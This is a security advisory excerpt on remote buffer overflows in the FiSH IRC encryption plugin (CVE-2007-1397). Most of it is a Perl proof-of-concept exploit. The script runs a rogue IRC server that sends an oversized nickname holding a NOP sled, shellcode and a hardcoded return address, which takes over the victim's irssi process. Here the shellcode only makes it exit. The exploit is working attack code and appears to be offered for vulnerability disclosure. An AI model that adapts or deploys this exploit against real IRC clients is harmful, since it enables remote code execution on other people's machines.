source: http://www.securityfocus.com/bid/22880/info

FiSH is prone to multiple remote buffer-overflow vulnerabilities because the application fails to bounds-check user-supplied data before copying it into an insufficiently sized buffer.

An attacker can exploit these issues to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial of service.

# FiSH IRC encryption evil ircd PoC exploit.
# Abuses CVE-2007-1397
# Bad ircd, nasty bnc provider, nicknames over 100 char --> ruin.
# Runs arbitrary code which which in this case shuts down irssi.
# Tested on my own compiled FiSH with irssi/fedora/x86
# There are a lot more problems like this one, you should /unload fish
# Caleb James DeLisle - cjd
 
use Socket;
 
$retPtr = \"\\x60\\xef\\xff\\xbf\";
 
# Pirated from some guy called gunslinger_
$exit1code = \"\\x31\\xc0\\xb0\\x01\\x31\\xdb\\xcd\\x80\";
 
$code = \"\\x90\" x 120 . $exit1code . $retPtr;
 
socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname(\"tcp\")) or die \"Couldn\'t open socket\";
bind(SOCKET, sockaddr_in(6667, inet_aton(\"127.0.0.1\"))) or die \"Couldn\'t bind to port 6667\";
listen(SOCKET,5) or die \"Couldn\'t listen on port\";
 
while(accept(CLIENT,SOCKET)){
    sleep 1;
    select((select(CLIENT), $|=1)[0]);
    print CLIENT \":-psyBNC!~cjd\\@ef.net PRIVMSG luser : :($code\\r\\n\";
}
close(SOCKET);
